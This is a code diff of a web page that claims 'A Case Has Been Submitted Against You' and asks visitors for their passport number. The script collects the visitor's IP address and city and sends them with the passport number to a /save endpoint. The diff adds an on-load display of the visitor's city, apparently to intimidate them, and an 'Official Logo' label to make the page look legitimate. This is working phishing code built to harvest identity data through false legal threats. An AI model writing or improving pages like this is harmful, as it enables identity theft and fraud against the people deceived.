@@ -23,8 +23,8 @@
             max-width: 400px;
         }
         .logo {
-            width: 240px;
-            height: 120px;
+            width: 100px;
+            height: 100px;
             margin-bottom: 1rem;
         }
         input {
@@ -45,27 +45,51 @@
         button:hover {
             background-color: #cc0000;
         }
+        #location {
+            margin-top: 1rem;
+            font-style: italic;
+            color: #555;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="/logo.png" alt="" class="logo">
+        <img src="/logo.png" alt="Official Logo" class="logo">
         <h2>A Case Has Been Submitted Against You</h2>
         <p>Enter your passport number to see details</p>
         <input type="text" id="passport" placeholder="Enter Passport Number">
         <button onclick="submitData()">Submit</button>
+        <div id="location">Detecting your location...</div>
     </div>
 
     <script>
+        // Fetch IP and city on page load
+        async function getCityFromIP() {
+            try {
+                // Get IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                // Get location from IP
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                const city = locationData.city || 'Unknown';
+
+                // Display the city
+                document.getElementById('location').textContent = `You are accessing this from ${city}`;
+            } catch (error) {
+                document.getElementById('location').textContent = 'Unable to detect location';
+                console.error('Error fetching location:', error);
+            }
+        }
+
+        // Submit form data (existing function)
         async function submitData() {
             const passport = document.getElementById('passport').value;
-            
-            // Get IP address
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
-
-            // Get location
             const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
             const locationData = await locationResponse.json();
 
@@ -82,17 +106,17 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Send data to server
             await fetch('/save', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
 
             alert('Data submitted successfully');
         }
+
+        // Load city when page loads
+        window.onload = getCityFromIP;
     </script>
 </body>
 </html>
